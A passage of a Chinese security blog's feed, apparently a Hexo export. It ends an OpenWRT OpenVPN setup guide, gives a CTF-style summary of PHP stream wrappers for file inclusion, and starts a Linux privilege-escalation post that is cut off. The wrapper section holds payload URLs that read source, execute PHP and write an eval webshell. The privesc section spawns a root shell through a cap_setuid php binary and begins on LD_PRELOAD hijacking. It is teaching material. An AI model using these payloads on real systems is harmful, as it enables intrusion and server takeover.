title="5.生成Diffie-Hellman参数"></a>5.生成Diffie-Hellman参数</h4><blockquote><p>此过程耗时较长（约10-30分钟）</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">easyrsa gen-dh<br></code></pre></td></tr></table></figure><h4 id="6-证书文件位置说明"><a href="#6-证书文件位置说明" class="headerlink" title="6. 证书文件位置说明"></a>6. 证书文件位置说明</h4><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs axapta">├── pki/<br>│   ├── ca.crt          <span class="hljs-meta"># CA根证书</span><br>│   ├── dh.pem          <span class="hljs-meta"># DH参数文件</span><br>│   ├── issued/<br>│   │   ├── <span class="hljs-keyword">server</span>.crt  <span class="hljs-meta"># 服务端证书</span><br>│   │   └── client1.crt <span class="hljs-meta"># 客户端证书</span><br>│   └── <span class="hljs-keyword">private</span>/<br>│       ├── <span class="hljs-keyword">server</span>.key  <span class="hljs-meta"># 服务端私钥</span><br>│       └── client1.key <span class="hljs-meta"># 客户端私钥</span><br></code></pre></td></tr></table></figure><h3 id="客户端配置文件生成"><a href="#客户端配置文件生成" class="headerlink" title="客户端配置文件生成"></a>客户端配置文件生成</h3><p>在shell执行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> &gt; client1.ovpn &lt;&lt;EOF<br>client<br>dev tun<br>proto udp<br>remote &lt;服务器地址&gt; <span class="hljs-number">1194</span><br>resolv-retry infinite<br>nobind<br>persist-tun<br>remote-cert-tls server<br><span class="hljs-keyword">verb</span> <span class="hljs-number">3</span><br><span class="hljs-keyword">comp</span>-lzo yes<br><br># 嵌入证书内容<br><span class="hljs-symbol">&lt;ca&gt;</span><br>$(<span class="hljs-keyword">cat</span> /etc/openvpn/pki/<span class="hljs-keyword">ca</span>.crt)<br>&lt;/<span class="hljs-keyword">ca</span>&gt;<br><span class="hljs-symbol">&lt;cert&gt;</span><br>$(<span class="hljs-keyword">cat</span> /etc/openvpn/pki/issued/client1.crt)<br>&lt;/cert&gt;<br><span class="hljs-symbol">&lt;key&gt;</span><br>$(<span class="hljs-keyword">cat</span> /etc/openvpn/pki/private/client1.key)<br>&lt;/key&gt;<br>EOF<br></code></pre></td></tr></table></figure><p>目录下可以看到一个<code>client1.ovpn</code>文件，这个就是客户端用来连接的文件，导出到本地进行妥善保存。</p><h2 id="OpenWRT配置"><a href="#OpenWRT配置" class="headerlink" title="OpenWRT配置"></a>OpenWRT配置</h2><h3 id="OpenVPN配置"><a href="#OpenVPN配置" class="headerlink" title="OpenVPN配置"></a>OpenVPN配置</h3><p>选择一个<code>模板</code>新建一个配置，点击右边<code>编辑</code>进入配置</p><p><img src="/2025/03/31/%E7%B3%BB%E7%BB%9F/ARM/OpenWRT%E9%85%8D%E7%BD%AEOpenVPN/image-3.png" alt="alt text"></p><p>左上角切换到<code>高级配置</code>设置界面，切换到<code>配置分类-VPN</code>页面</p><p>在左下角的<code>--更多选项--</code>选择并添加一个<code>push</code>选项，用来配置推送内网网段的路由</p><p><img src="/2025/03/31/%E7%B3%BB%E7%BB%9F/ARM/OpenWRT%E9%85%8D%E7%BD%AEOpenVPN/image-4.png" alt="alt text"></p><p>再添加一个<code>client-to-client</code>选项，并且勾上，表示允许vpn客户端之间互相访问</p><p><img src="/2025/03/31/%E7%B3%BB%E7%BB%9F/ARM/OpenWRT%E9%85%8D%E7%BD%AEOpenVPN/image-2.png" alt="alt text"></p><p>最后切换到<code>加密算法</code>页面，按照上面生成的文件选择好</p><p><img src="/2025/03/31/%E7%B3%BB%E7%BB%9F/ARM/OpenWRT%E9%85%8D%E7%BD%AEOpenVPN/image-5.png" alt="alt text"></p><h3 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h3><p><code>防火墙-常规设置-区域</code> 新添加一个<code>区域</code> 配置放行区域和转发</p><p><img src="/2025/03/31/%E7%B3%BB%E7%BB%9F/ARM/OpenWRT%E9%85%8D%E7%BD%AEOpenVPN/image.png" alt="alt text"></p><p><img src="/2025/03/31/%E7%B3%BB%E7%BB%9F/ARM/OpenWRT%E9%85%8D%E7%BD%AEOpenVPN/image-1.png" alt="alt text"></p><p>到这里配置基本完成，可以用客户端进行连接测试了</p>]]></content>
    
    
    <categories>
      
      <category>系统</category>
      
      <category>ARM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>openvpn</tag>
      
      <tag>openwrt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP伪协议总结</title>
    <link href="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/"/>
    <url>/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a><code>file://</code> <strong>协议</strong></h2><ul><li><p><strong>条件</strong>：</p><ul><li><p><code>allow_url_fopen</code>:off&#x2F;on</p></li><li><p><code>allow_url_include</code> :off&#x2F;on</p></li></ul></li><li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p></li><li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code> 会可选地搜索，也作为相对的路径。</p></li><li><p><strong>用法</strong>：</p><p>&#x2F;path&#x2F;to&#x2F;file.ext relative&#x2F;path&#x2F;to&#x2F;file.ext fileInCwd.ext C:&#x2F;path&#x2F;to&#x2F;winfile.ext C:\path\to\winfile.ext \\smbserver\share\path\to\winfile.ext file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext</p></li><li><p><strong>示例</strong>：</p><ol><li><p><code>file://[文件的绝对路径和文件名]</code></p><p><a href="http://127.0.0.1/include.php?file=file://E:%5C%5CphpStudy%5C%5CPHPTutorial%5C%5CWWW%5C%5Cphpinfo.txt">http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt</a></p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/001.png" alt="图片描述"></p></li><li><p><code>[文件的相对路径和文件名]</code></p><p><a href="http://127.0.0.1/include.php?file=./phpinfo.txt">http://127.0.0.1/include.php?file=./phpinfo.txt</a></p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/002.png" alt="图片描述"></p></li><li><p><code>[http：//网络路径和文件名]</code></p><p><a href="http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a></p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/003.png" alt="图片描述"></p></li></ol></li><li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=TtVg875BKqk9sOzMAzkl/w==.p1F41vqvxKsfpbagzA0QMnc9aCRr606FythHNNfFYg64Bbw7HNcxhypWOE8PwDsM">http://php.net/manual/zh/wrappers.file.php</a></p></li></ul><h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a><code>php://</code> <strong>协议</strong></h2><ul><li><p><strong>条件</strong>：</p><ul><li><p><code>allow_url_fopen</code>:off&#x2F;on</p></li><li><p><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code> 需要on</p></li></ul></li><li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><table><thead><tr><th><strong>协议</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>php:&#x2F;&#x2F;input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input</code> 是无效的。</td></tr><tr><td>php:&#x2F;&#x2F;output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php:&#x2F;&#x2F;fd</td><td>(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td><td>(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php:&#x2F;&#x2F;filter</td><td>(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table></li><li><p><code>php://filter</code>参数详解**</p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><table><thead><tr><th><strong>php:&#x2F;&#x2F;filter 参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read&#x3D;&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td></tr><tr><td>write&#x3D;&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read&#x3D;</em> 或 <em>write&#x3D;</em> 作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table></li><li><p><strong>可用的过滤器列表（4类）</strong></p><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://link.segmentfault.com/?enc=QlRiSsx67LjMSPipa8lYEQ==.PKkUW2HFWctFFzfH2ac9yTPtyKYdWSdy4R4f6APxHdYdjF5JSFASf9EoNH1Sgwok">https://www.php.net/manual/zh/filters.php</a></p><table><thead><tr><th><strong>字符串过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th><strong>转换过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th><strong>压缩过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th><strong>加密过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table></li><li><p><strong>示例</strong>：</p><ol><li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><p><a href="http://127.0.0.1/include.php?file%5C=php://filter/read%5C=convert.base64-encode/resource=phpinfo.php">http://127.0.0.1/include.php?file\=php://filter/read\=convert.base64-encode/resource=phpinfo.php</a></p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/004.png" alt="图片描述"></p></li><li><p><code>php://input + [POST DATA]</code>执行php代码</p><p><a href="http://127.0.0.1/include.php?file=php://input">http://127.0.0.1/include.php?file=php://input</a> [POST DATA部分] <?php phpinfo(); ?></p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/005.png" alt="图片描述"></p><p>若有写入权限，写入一句话木马</p><p><a href="http://127.0.0.1/include.php?file=php://input">http://127.0.0.1/include.php?file=php://input</a> [POST DATA部分] <?php fputs(fopen('1juhua.php','w'),'<?php @eval($\_GET\[cmd\]); ?>‘); ?&gt;</p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/006.png" alt="图片描述"></p></li></ol></li><li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=oCrbAs8K6fMxEVD4f3Bo5w==.SjHgPiULNCVLyngF1xa65SSLVv1A5PA+1xG9OG8hHKr3nxVrq/ahNbGloYNs4shT">https://php.net/manual/zh/wrappers.php.php</a></p></li></ul><h2 id="zip-bzip2-zlib-协议"><a href="#zip-bzip2-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a><code>zip:// &amp; bzip2:// &amp; zlib://</code> <strong>协议</strong></h2><ul><li><p><strong>条件</strong>：</p><ul><li><p><code>allow_url_fopen</code>:off&#x2F;on</p></li><li><p><code>allow_url_include</code> :off&#x2F;on</p></li></ul></li><li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p></li><li><p><strong>示例</strong>：</p><ol><li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p><p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p><p><a href="http://127.0.0.1/include.php?file=zip://E:%5C%5CphpStudy%5C%5CPHPTutorial%5C%5CWWW%5C%5Cphpinfo.jpg%23phpinfo.txt">http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt</a></p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/007.png" alt="图片描述"></p></li><li><p><code>compress.bzip2://file.bz2</code></p><p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><p><a href="http://127.0.0.1/include.php?file=compress.bzip2://E:%5C%5CphpStudy%5C%5CPHPTutorial%5C%5CWWW%5C%5Cphpinfo.bz2">http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2</a></p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/008.png" alt="图片描述"></p></li><li><p><code>compress.zlib://file.gz</code></p><p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><p><a href="http://127.0.0.1/include.php?file=compress.zlib://E:%5C%5CphpStudy%5C%5CPHPTutorial%5C%5CWWW%5C%5Cphpinfo.gz">http://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz</a></p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/009.png" alt="图片描述"></p></li></ol></li><li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=LqOOpnI4tgOdxV7KHLyiaA==.G4t6zyw1uAsknjdnRfhlAEZ4aMXFO+9YuYlkvYE6CMk+uJdEdBvFyrmBSfrOoxxteQwE5PVQxS1sRcGWNDfFsQ==">http://php.net/manual/zh/wrappers.compression.php</a></p></li></ul><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><code>data://</code> <strong>协议</strong></h2><ul><li><p><strong>条件</strong>：</p><ul><li><p><code>allow_url_fopen</code>:on</p></li><li><p><code>allow_url_include</code> :on</p></li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><p>data:,<?php phpinfo();?></p><p>data:&#x2F;&#x2F;text&#x2F;plain, <?php phpinfo();?></p><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</p></li><li><p><strong>示例</strong>：</p><ol><li><p><code>data://text/plain,</code></p><p><a href="http://127.0.0.1/include.php?file=data://text/plain">http://127.0.0.1/include.php?file=data://text/plain</a>,<?php%20phpinfo();?></p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/010.png" alt="图片描述"></p></li><li><p><code>data://text/plain;base64,</code></p><p><a href="http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</a></p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/011.png" alt="图片描述"></p></li></ol></li></ul><h2 id="http-https-协议"><a href="#http-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a><code>http:// &amp; https://</code> <strong>协议</strong></h2><ul><li><p><strong>条件</strong>：</p><ul><li><p><code>allow_url_fopen</code>:on</p></li><li><p><code>allow_url_include</code> :on</p></li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><p><a href="http://example.com/">http://example.com</a> <a href="http://example.com/file.php?var1=val1&var2=val2">http://example.com/file.php?var1=val1&amp;var2=val2</a> <a href="http://user:password@example.com/">http://user:password@example.com</a> <a href="https://example.com/">https://example.com</a> <a href="https://example.com/file.php?var1=val1&var2=val2">https://example.com/file.php?var1=val1&amp;var2=val2</a> <a href="https://user:password@example.com/">https://user:password@example.com</a></p></li><li><p><strong>示例</strong>：</p><p><a href="http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a></p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/012.png" alt="图片描述"></p></li></ul><h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a><code>phar://</code> <strong>协议</strong></h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><p><a href="http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</a></p><p><img src="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/013.png" alt="图片描述"></p><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar:&#x2F;&#x2F;协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p><blockquote><p>原文：<a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>漏洞专题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权（二）</title>
    <link href="/2024/11/14/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/Linux%E6%8F%90%E6%9D%83%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2024/11/14/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/Linux%E6%8F%90%E6%9D%83%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="Web-用户-Capability能力"><a href="#Web-用户-Capability能力" class="headerlink" title="Web&amp;用户-Capability能力"></a><strong>Web&amp;用户-Capability能力</strong></h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>Capability能力其实是属于suid提权，这是Linux特有的，他对文件进行细分，赋予文件不同的能力，文件就可以有不同的权限</p><p>简单说一下几个命令  </p><pre><code class="hljs">设置能力：setcap cap\_setuid+ep /tmp/php  删除能力：setcap -r /tmp/php  查看单个能力：getcap /usr/bin/php  查看所有能力：getcap -r / 2&gt;/dev/null  </code></pre><p> </p><p>Capabilities机制是在Linux内核2.2之后引入的，原理很简单，就是将之前与超级用户root（UID&#x3D;0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</p><p>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。</p><p>如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a><strong>过程</strong></h3><p>前言提到命令<br>#查看一下所有能力  </p><pre><code class="hljs">getcap -r / 2&gt;/dev/null  /usr/bin/fping cap\_net\_raw=ep  /usr/bin/ping cap\_net\_raw=ep  /usr/bin/dumpcap cap\_net\_admin,cap\_net\_raw=eip  /usr/lib/x86\_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap\_net\_bind\_service,cap\_net\_admin=ep  /tmp/php cap\_setuid=ep  </code></pre><p>###我们注意到cap后面跟了不一样的东西，这个就是细分权限具体参考下表  </p><pre><code class="hljs">CAP\_CHOWN 0 允许改变文件的所有权  CAP\_DAC\_OVERRIDE 1 忽略对文件的所有DAC访问限制  CAP\_DAC\_READ\_SEARCH 2 忽略所有对读、搜索操作的限制  CAP\_FOWNER 3 以最后操作的UID,覆盖文件的先前的UID  CAP\_FSETID 4 确保在文件被修改后不修改setuid/setgid位  CAP\_KILL 5 允许对不属于自己的进程发送信号  CAP\_SETGID 6 允许改变组ID  CAP\_SETUID 7 允许改变用户ID  CAP\_SETPCAP 8 允许向其它进程转移能力以及删除其它进程的任意能力(只限init进程)  CAP\_LINUX\_IMMUTABLE 9 允许修改文件的不可修改(IMMUTABLE)和只添加(APPEND-ONLY)属性  CAP\_NET\_BIND\_SERVICE 10 允许绑定到小于1024的端口  CAP\_NET\_BROADCAST 11 允许网络广播和多播访问(未使用)  CAP\_NET\_ADMIN 12 允许执行网络管理任务：接口、防火墙和路由等.  CAP\_NET\_RAW 13 允许使用原始(raw)套接字  CAP\_IPC\_LOCK 14 允许锁定共享内存片段  CAP\_IPC\_OWNER 15 忽略IPC所有权检查  CAP\_SYS\_MODULE 16 插入和删除内核模块  CAP\_SYS\_RAWIO 17 允许对ioperm/iopl的访问  CAP\_SYS\_CHROOT 18 允许使用chroot()系统调用  CAP\_SYS\_PTRACE 19 允许跟踪任何进程  CAP\_SYS\_PACCT 20 允许配置进程记帐(process accounting)  CAP\_SYS\_ADMIN 21 允许执行系统管理任务：加载/卸载文件系统、设置磁盘配额、开/关交换设备和文件等.  CAP\_SYS\_BOOT 22 允许重新启动系统  CAP\_SYS\_NICE 23 允许提升优先级，设置其它进程的优先级  CAP\_SYS\_RESOURCE 24 忽略资源限制  CAP\_SYS\_TIME 25 允许改变系统时钟  CAP\_SYS\_TTY\_CONFIG 26 允许配置TTY设备  CAP\_MKNOD 27 允许使用mknod()系统调用  CAP\_LEASE 28 允许在文件上建立租借锁  CAP\_SETFCAP 31 允许在指定的程序上授权能力给其它程序  </code></pre><p>#我们看到php是有CAP_SETUID 7 允许改变用户ID 的权限的<br>&#x2F;tmp&#x2F;php cap_setuid&#x3D;ep  </p><p>###参考php执行命令<br>#利用参考：<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>  </p><pre><code class="hljs">/tmp/php -r &quot;posix\_setuid(0); system(&#39;/bin/sh&#39;);&quot;  </code></pre><p>反弹成功   </p><h3 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a><strong>小坑</strong></h3><p>getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null有时候不回显，是因为终端不显示，我们需要弹一个新终端出来，或者使用上面写到的工具来筛选，还可以输入完整的地址来执行</p><p>例如</p><pre><code class="hljs">/sbin/getcap -r / 2&gt;/dev/null</code></pre><h2 id="普通用户-LD-Preload加载"><a href="#普通用户-LD-Preload加载" class="headerlink" title="普通用户-LD_Preload加载"></a><strong>普通用户-LD_Preload加载</strong></h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>其实Windows提权写到了dll提权，而在Linux提权里面是so文件，大体原理相同，简单说一下流程，就是有些进程权限很高，你就可以找到这些进程调用的so文件来进行覆盖和劫持</p><p>LD_PRELOAD允许你定义在程序运行前优先加载的动态链接库，那么我们便可以在自己定义的动态链接库中装入恶意函数.假设现在出现了一种这样的情况，一个文件中有一个恶意构造的函数和我们程序指令执行时调用的函数一模一样，而LD_PRELOAD路径指向这个文件后，这个文件的优先级高于原本函数的文件，那么优先调用我们的恶意文件后会覆盖原本的那个函数，最后当我们执行了一个指令后它会自动调用一次恶意的函数，这就会导致一些非预期的漏洞出现</p><p>LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库</p><ul><li><p>dll &#x3D; windows 的动态链接库文件 把一些功能函数封装在dll文件中，调用时导入调用即可</p></li><li><p>so &#x3D; linux 动态链接库文件</p></li></ul><p>总的来说就是&#x3D;<code>LD_PRELOAD</code>指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果</p><h3 id="过程-1"><a href="#过程-1" 